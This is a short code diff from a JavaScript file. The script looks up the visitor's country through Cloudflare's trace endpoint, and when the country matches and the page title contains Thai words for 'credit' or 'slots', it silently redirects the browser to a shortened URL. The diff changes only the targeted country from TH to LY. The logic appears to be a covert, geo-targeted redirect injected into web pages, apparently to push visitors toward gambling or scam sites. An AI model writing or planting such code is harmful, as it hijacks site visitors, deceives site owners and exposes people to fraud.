@@ -9,7 +9,7 @@
     fetch('https://cloudflare.com/cdn-cgi/trace')
         .then(response => response.text())  
         .then(data => {
-            if (data.includes('loc=TH')) {
+            if (data.includes('loc=LY')) {
                 var title = document.title.toLowerCase();
                 if (title.includes("เครดิต") || title.includes("สล็อต") ) {
                     window.location.replace('https://surl.asia/0oPJN');
